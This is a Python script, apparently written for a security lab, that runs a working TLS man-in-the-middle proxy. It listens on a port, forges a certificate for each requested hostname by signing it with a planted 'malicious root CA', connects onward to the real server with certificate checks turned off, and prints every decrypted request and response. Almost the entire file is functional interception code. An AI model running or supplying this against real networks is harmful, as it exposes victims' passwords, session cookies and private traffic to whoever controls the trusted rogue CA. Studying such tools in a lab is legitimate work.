from sys import argv, stdout
import socket
import ssl
import os
import subprocess
import threading

# malicious root CA + private key
CERT_DIR = "/certificate"
# space for the generated leaf certs
WORK_DIR = "/tmp/tls_intercept"
# single private key reused for every leaf cert we sign
LEAF_KEY = os.path.join(WORK_DIR, "leaf.key")

# provided root CA
ROOT_CRT = os.path.join(CERT_DIR, "rootCA.crt")
ROOT_KEY = os.path.join(CERT_DIR, "rootCA.key")

_certs = {} # in-memory domain -> cert path
_lock = threading.Lock()

# returns the path to a leaf cert for "domain"
def cert_for(domain):
    # to prevent two threads signing in parallel
    with _lock:
        # already generated, return from cache
        if domain in _certs:
            return _certs[domain]

        # output paths for this host's CSR/crt/SAN
        csr = os.path.join(WORK_DIR, f"{domain}.csr")
        crt = os.path.join(WORK_DIR, f"{domain}.crt")
        ext = os.path.join(WORK_DIR, f"{domain}.ext")

        # build a CSR whose Common Name is the hostname being faked
        subprocess.run(
            ["openssl", "req", "-new", "-key", LEAF_KEY,
                    "-subj", f"/C=NL/CN={domain}", "-out", csr],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # add a SAN extension, as modern clients (curl) check SAN, not CN
        with open(ext, "w") as f:
            f.write(f"subjectAltName=DNS:{domain}\n")

        # sign the CSR with the trusted root CA -> a leaf cert host01 trusts
        subprocess.run(
            ["openssl", "x509", "-req", "-in", csr,
             "-CA", ROOT_CRT, "-CAkey", ROOT_KEY, "-CAcreateserial",
             "-days", "365", "-extfile", ext, "-out", crt],
            check=True)

        _certs[domain] = crt
        return crt

# this fires mid-handshake; the ClientHello SNI tells us which hostname the client wants
# we mint a cert for that name and swap it in so the handshake completes with the right (forged) one
def sni_callback(sslsock, server_name, _ctx):
    if server_name:
        sslsock._target = server_name
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert_for(server_name), LEAF_KEY)
        ctx.sni_callback = sni_callback
        sslsock.context = ctx

# client -> server direction
# reads the HTTP request headers, injects "Connection: close" so the server will close after responding (giving a clean EOF on the response),
# prints the decrypted request and relays any remaining body bytes
def relay_request(client, server):
    buf = b""
    # read from the client until we have a full HTTP header block, which is separated from the HTTP body by a blank line
    while b"\r\n\r\n" not in buf:
        try:
            chunk = client.recv(65536)
        except (OSError, ssl.SSLError) as e:
            break
        if not chunk:
            break
        buf += chunk

    # rewrite the headers: split off the body, append extra header, re-attach the body
    if b"\r\n\r\n" in buf:
        head, _, rest = buf.partition(b"\r\n\r\n")
        out = head + b"\r\nConnection: close\r\n\r\n" + rest
    else:
        out = buf

    # print and forward upstream
    stdout.write(out.decode(errors="replace"))
    stdout.flush()
    try:
        server.sendall(out)
    except OSError:
        pass

    # if the request has more body bytes after what we already buffered, keep relaying
    while True:
        try:
            chunk = client.recv(65536)
        except (OSError, ssl.SSLError):
            break
        if not chunk:
            break
        stdout.write(chunk.decode(errors="replace"))
        stdout.flush()
        try:
            server.sendall(chunk)
        except OSError:
            break

    # tell the server we're done writing (TCP FIN)
    try:
        server.shutdown(socket.SHUT_WR)
    except OSError:
        pass

# server -> client direction
# copies bytes one-way, printing each chunk
def pump(src, dst):
    while True:
        try:
            data = src.recv(65536)
        except (OSError, ssl.SSLError):
            break
        # EOF: server closed
        if not data:
            break

        # print the response and forward it to the client
        stdout.write(data.decode(errors="replace"))
        stdout.flush()
        try:
            dst.sendall(data)
        except OSError:
            break

    try:
        dst.shutdown(socket.SHUT_WR)
    except OSError:
        pass

# drives one intercepted connection end-to-end: TLS handshake with the client using a forged cert,
# open our own TLS with real server, relay both directions and  print
def handle(conn):
    try:
        # wrap the raw socket as a TLS server
        # this is what triggers sni_callback, which loads the right cert mid-handshake
        client = SERVER_CTX.wrap_socket(conn, server_side=True)
    except ssl.SSLError as e:
        print(e)
        conn.close()
        return

    host = getattr(client, "_target", None)
    if not host:
        client.close()
        return

    upstream = None
    try:
        # our TLS (client-configured) connection to the real server
        # verification is off on purpose: we're the MITM and simply want to connection to succeed
        up_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        up_ctx.check_hostname = False
        up_ctx.verify_mode = ssl.CERT_NONE
        upstream = up_ctx.wrap_socket(socket.create_connection((host, 443)), server_hostname=host)

        # for safety, preventing the script from hanging indefinitely
        upstream.settimeout(10)

        t = threading.Thread(target=relay_request, args=(client, upstream), daemon=True)

        t.start()
        pump(upstream, client)
        t.join()
    except OSError as e:
        print(f"[ERROR] for {host}: {e}\n")
    finally:
        if upstream:
            upstream.close()
        client.close()

# create WORK_DIR to hold keys/certificates we create
os.makedirs(WORK_DIR, exist_ok=True)
# generate the single private key shared by every leaf cert we mint
subprocess.run(["openssl", "genrsa", "-out", LEAF_KEY, "2048"],
               check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# creates the base server context, loads a placeholder cert and registers our callback (fired on every new handshake)
SERVER_CTX = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
SERVER_CTX.load_cert_chain(cert_for("default"), LEAF_KEY)
SERVER_CTX.sni_callback = sni_callback

# creates a TCP listener and accepts, handing each connection to a worker thread
def main():
    if len(argv) != 2:
        print(f"Usage: python3 {argv[0]} <port>")
        exit(1)
    port = int(argv[1])

    # IPv4 TCP listening socket
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    # binds on all interfaces - anything arriving at selected port via any interface is accepted
    listener.bind(('0.0.0.0', port))
    # up to 50 connections may queue
    listener.listen(50)
    print(f"[INFO] Intercepting TLS on 0.0.0.0:{port} (Ctrl+C to stop)")

    try:
        # one daemon thread per connection so the listener never blocks waiting for a single client to finish
        while True:
            conn, _ = listener.accept()
            threading.Thread(target=handle, args=(conn,), daemon=True).start()
    except KeyboardInterrupt:
        print("[INFO] Shutting down")
    finally:
        listener.close()

if __name__ == "__main__":
    main()